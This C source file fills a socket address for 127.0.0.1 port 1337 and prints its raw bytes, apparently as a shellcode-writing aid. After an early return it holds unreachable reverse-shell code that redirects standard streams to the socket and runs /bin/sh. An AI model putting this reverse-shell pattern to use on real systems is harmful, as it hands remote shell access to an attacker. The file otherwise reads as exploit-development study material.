#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#define SA struct sockaddr
#define PORT 1337

void print_bytes(void *ptr, int size) 
{
    unsigned char *p = ptr;
    int i;
    for (i=0; i<size; i++) {
        printf("%02hhX ", p[i]);
    }
    printf("\n");
}
int main(int argc, char const *argv[])
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    servaddr.sin_family = 2; 
    //printf("family is : %d \n",AF_INET);     
    servaddr.sin_addr.s_addr = 16777343;
    //printf("adress is : %d \n",inet_addr("127.0.0.1"));
    servaddr.sin_port = 14597;
    //printf("port number is : %u",htons(PORT));
    print_bytes(((SA*)&servaddr), sizeof(servaddr));
    printf("%d", sizeof(servaddr));
    return 0;
    connect(sockfd, (SA*)&servaddr, sizeof(servaddr));
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);
    char *const parmList[] = {"/bin/ls", NULL};
    execv( "/bin/sh", parmList );
      
    
}

